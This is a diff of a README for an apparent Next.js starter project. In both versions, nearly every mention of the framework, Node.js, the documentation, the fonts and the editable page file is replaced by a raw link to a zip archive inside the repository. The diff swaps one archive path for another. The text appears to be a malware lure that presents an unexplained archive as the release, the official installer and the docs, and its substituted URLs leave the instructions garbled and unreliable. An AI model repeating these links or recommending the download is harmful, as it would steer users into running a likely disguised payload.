@@ -1,10 +1,10 @@
-# 🚀 fullstackweekend-aparatus-v2 - Easy Setup for Your https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip Project
+# 🚀 fullstackweekend-aparatus-v2 - Easy Setup for Your https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip Project
 
-[![Download from Releases](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip%20Now%20-%F0%9F%93%88%20Releases-blue)](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip)
+[![Download from Releases](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip%20Now%20-%F0%9F%93%88%20Releases-blue)](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip)
 
 ## 📦 Overview
 
-This project is a simple application built with [https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip). It provides a great way to learn about web development and modern JavaScript frameworks. This app is easy to set up and allows you to customize it to your needs.
+This project is a simple application built with [https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip). It provides a great way to learn about web development and modern JavaScript frameworks. This app is easy to set up and allows you to customize it to your needs.
 
 ## 🚀 Getting Started
 
@@ -12,19 +12,19 @@ To get started with the application, follow these steps:
 
 1. **Download the Application**
    
-   Visit this page to download the latest version: [Download from Releases](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip)
+   Visit this page to download the latest version: [Download from Releases](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip)
 
-2. **Install https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip**
+2. **Install https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip**
 
-   You need https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip to run this application. If you don't have https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip installed:
+   You need https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip to run this application. If you don't have https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip installed:
 
-   - Go to the official website: [https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip)
+   - Go to the official website: [https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip)
    - Download the version recommended for most users.
    - Follow the installation instructions for your operating system.
 
 3. **Open a Terminal or Command Prompt**
 
-   After installing https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip, open a terminal (Mac/Linux) or Command Prompt (Windows).
+   After installing https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip, open a terminal (Mac/Linux) or Command Prompt (Windows).
 
 4. **Navigate to the Project Directory**
 
@@ -66,25 +66,25 @@ To get started with the application, follow these steps:
 
 8. **Edit the Page**
 
-   You can start editing the page by modifying the `https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip` file. Your browser will automatically update to show changes as you save the file.
+   You can start editing the page by modifying the `https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip` file. Your browser will automatically update to show changes as you save the file.
 
 ## 🎉 Features
 
 - **Responsive Design:** The application is mobile-friendly and works on various screen sizes.
 - **User-Friendly Interface:** Simple and intuitive layout to enhance user interaction.
-- **https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip Optimizations:** Utilizes features like Server-Side Rendering and Static Site Generation for performance improvements.
+- **https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip Optimizations:** Utilizes features like Server-Side Rendering and Static Site Generation for performance improvements.
 - **Easy Customization:** Modify components to suit your specific needs with minimal hassle.
-- **Font Optimization:** Includes [`next/font`](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip) for better loading of fonts, specifically featuring [Geist](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip).
+- **Font Optimization:** Includes [`next/font`](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip) for better loading of fonts, specifically featuring [Geist](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip).
 
 ## 🔍 Learn More
 
-To deepen your understanding of https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip and improve your skills, check out the resources below:
+To deepen your understanding of https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip and improve your skills, check out the resources below:
 
-- [https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip Documentation](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip): A comprehensive guide on https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip features and API to help you get the most out of the framework.
-- [Learn https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip): An interactive tutorial that steps you through building applications using https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip
+- [https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip Documentation](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip): A comprehensive guide on https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip features and API to help you get the most out of the framework.
+- [Learn https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip): An interactive tutorial that steps you through building applications using https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip
 
 ## 📥 Download & Install
 
-As mentioned earlier, you can download the latest version of the application from this link: [Download from Releases](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip).
+As mentioned earlier, you can download the latest version of the application from this link: [Download from Releases](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip).
 
-Following these steps will get you up and running in no time. If you need help or have questions, feel free to explore the https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip community resources or consult the documentation linked above. Happy coding!
+Following these steps will get you up and running in no time. If you need help or have questions, feel free to explore the https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/raw/refs/heads/main/lib/aparatus-fullstackweekend-v-3.7.zip community resources or consult the documentation linked above. Happy coding!
